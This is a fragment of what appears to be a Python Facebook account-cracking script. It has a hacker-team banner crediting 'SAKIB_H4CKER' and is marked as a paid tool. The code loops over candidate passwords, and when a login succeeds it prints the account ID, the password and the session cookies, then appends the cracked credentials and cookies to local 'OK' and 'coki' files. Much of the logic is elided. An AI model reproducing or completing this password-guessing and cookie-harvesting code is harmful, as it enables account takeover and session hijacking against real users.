...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ┌━━━━━━━━━━━━━━━━━ N3OB ━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  SAKIB_H4CKER            
               \033[1;91mFACEBOK      :  SAKIB  BRO      
               \033[1;97mGITHUB       :  N3OBH4CKER       
               \033[1;91mSTATUS       :   PAID😴            
               \033[1;97mTEAM         :  BD  : HACKERS                 
        ...
        for ps in pwx:
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mOSAKIB-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('SAKIB-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('SAKIB-coki.txt', 'a').write(coki+'\n')
